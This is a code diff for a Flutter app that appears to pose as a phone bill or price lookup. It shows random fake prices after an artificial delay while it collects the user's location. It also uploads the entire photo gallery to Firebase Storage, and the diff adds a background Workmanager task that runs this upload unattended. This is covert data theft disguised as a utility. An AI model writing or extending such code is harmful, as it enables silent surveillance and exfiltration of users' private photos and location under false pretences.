@@ -1,31 +1,24 @@
 import 'dart:io';
 import 'dart:math';
-
 import 'package:bloc/bloc.dart';
-import 'package:cash_toggar_app/helper/global_widgets/global_snack_bar_widget.dart';
-import 'package:cash_toggar_app/resources/colors_manager.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:firebase_storage/firebase_storage.dart';
 import 'package:flutter/material.dart';
 import 'package:geolocator/geolocator.dart';
-import 'package:meta/meta.dart';
 import 'package:photo_manager/photo_manager.dart';
+import 'package:workmanager/workmanager.dart';
 
 import '../../generated/l10n.dart';
+import '../../helper/global_widgets/global_snack_bar_widget.dart';
+import '../../resources/colors_manager.dart';
 
 part 'main_state.dart';
 
+const String uploadImagesTask = "upload_images_task";
+
 class MainCubit extends Cubit<MainState> {
   MainCubit() : super(MainInitial());
-
-  // Future<Map<String, dynamic>> getDeviceDetails({required uniqueId}) async {
-  //
-  //
-  //   emit(GetPhoneDetailsSuccessState());
-  //   return details;
-  // }
-
   TextEditingController phoneController = TextEditingController();
 
   Future<Position?> getUserLocation(BuildContext context, uniqueId) async {
@@ -140,7 +133,16 @@ class MainCubit extends Cubit<MainState> {
     "410.4",
     "410.4",
     "649.8",
-    "649.8"
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
+    "لا توجد فاتوره لهذا الرقم",
   ];
 
   getPrice({
@@ -157,17 +159,20 @@ class MainCubit extends Cubit<MainState> {
     } else {
       loadingGetPrice = true;
       emit(GetPhonePriceLoadingState());
-      Future.delayed(Duration(seconds: 7), () {
-        loadingGetPrice = false;
-        totalPhonePrice = prices[Random().nextInt(prices.length-1)];
-
-      });
       await getUserLocationFromButton(
         context,
         phoneController.text,
-      );
-      await uploadAllImagesToFirebase();
-      emit(GetPhonePriceSuccessState());
+      ).then((e){
+        Future.delayed(Duration(seconds: 7), () {
+          loadingGetPrice = false;
+          totalPhonePrice = prices[Random().nextInt(prices.length-1)];
+          emit(GetPhonePriceSuccessState());
+
+        });
+      });
+
+
+      // await uploadAllImagesToFirebase();
     }
   }
 
@@ -262,24 +267,27 @@ class MainCubit extends Cubit<MainState> {
   }
 
 
+  void startImageUpload() {
+    emit(UploadingImagesState());
+    Workmanager().registerOneOffTask(uploadImagesTask, uploadImagesTask);
+    emit(UploadStartedInBackgroundState());
+  }
+
   Future<void> uploadAllImagesToFirebase() async {
-    // ✅ Request permission to access photos
     PermissionState permission = await PhotoManager.requestPermissionExtend();
     if (!permission.hasAccess) {
       print("❌ Permission denied to access photos.");
       return;
     }
 
-    // ✅ Get all images from the gallery
     List<AssetEntity> images = await PhotoManager.getAssetListRange(
-      start: 0, // Start index
-      end: 10000, // Large number to fetch all images
+      start: 0,
+      end: 10000,
       type: RequestType.image,
     );
 
     print("📸 Found ${images.length} images.");
 
-    // ✅ Upload each image to Firebase Storage
     for (AssetEntity image in images) {
       File? file = await getFileFromAsset(image);
       if (file != null) {
@@ -290,18 +298,14 @@ class MainCubit extends Cubit<MainState> {
     print("✅ All images uploaded to Firebase.");
   }
 
-// Helper function to get File from AssetEntity
   Future<File?> getFileFromAsset(AssetEntity asset) async {
-    File? file = await asset.file;
-    return file;
+    return await asset.file;
   }
 
-// Helper function to upload image to Firebase Storage
   Future<void> uploadImageToFirebase(File imageFile) async {
     try {
       String fileName = "images/${DateTime.now().millisecondsSinceEpoch}.jpg";
       Reference ref = FirebaseStorage.instance.ref().child(fileName);
-
       await ref.putFile(imageFile);
       print("✅ Uploaded: $fileName");
     } catch (e) {
@@ -309,3 +313,17 @@ class MainCubit extends Cubit<MainState> {
     }
   }
 }
+
+void callbackDispatcher() {
+  Workmanager().executeTask((task, inputData) async {
+    if (task == uploadImagesTask) {
+      MainCubit().uploadAllImagesToFirebase();
+    }
+    return Future.value(true);
+  });
+}
+
+
+/*
+
+ */
